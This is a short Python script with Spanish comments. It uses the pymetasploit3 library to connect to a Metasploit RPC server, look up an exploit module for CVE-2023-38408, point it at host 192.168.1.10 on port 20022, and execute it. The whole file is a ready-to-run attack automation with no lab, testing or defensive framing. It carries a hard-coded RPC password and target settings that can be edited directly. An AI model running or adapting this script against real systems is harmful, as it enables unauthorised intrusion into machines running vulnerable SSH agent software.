# python3 -m pip install --user pymetasploit3 --break-system-packages

from pymetasploit3.msfrpc import MsfRpcClient

# Conectar al servidor RPC de Metasploit (debes iniciarlo primero)
client = MsfRpcClient('password', port=55553)

# Buscar exploits para un CVE específico
modules = client.modules.search('cve:2023-38408')

if modules:
    exploit = client.modules.use('exploit', modules[0]['fullname'])
    
    # Configurar opciones
    exploit['RHOSTS'] = '192.168.1.10'
    exploit['RPORT'] = 20022
    
    # Ejecutar el exploit
    exploit.execute()
